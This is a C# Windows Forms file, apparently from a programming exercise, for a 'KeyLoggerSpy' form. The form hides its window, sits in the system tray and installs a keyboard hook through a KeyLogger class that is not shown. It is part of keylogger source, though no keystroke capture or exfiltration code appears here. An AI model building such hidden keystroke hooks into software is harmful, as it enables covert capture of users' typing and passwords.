using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SP_5
{
    public partial class KeyLoggerSpy : Form
    {
        KeyLogger keyLoger = new KeyLogger();
        public KeyLoggerSpy()
        {
            InitializeComponent();
            Load += KeyLogerSpy_Load;
            Shown += KeyLogerSpy_Shown;
            FormClosed += KeyLogerSpy_FormClosed;
            notifyIcon1.DoubleClick += NotifyIcon1_DoubleClick;
        }
        private void KeyLogerSpy_FormClosed(object sender, FormClosedEventArgs e)
        {
            keyLoger.UnHook();
        }
        private void KeyLogerSpy_Load(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
            notifyIcon1.Icon = Icon;
            keyLoger.SetHook();
        }

        private void KeyLogerSpy_Shown(object sender, EventArgs e)
        {
            Visible = false;
            WindowState = FormWindowState.Minimized;
        }

        private void NotifyIcon1_DoubleClick(object sender, EventArgs e)
        {
            Close();
        }
    }
}
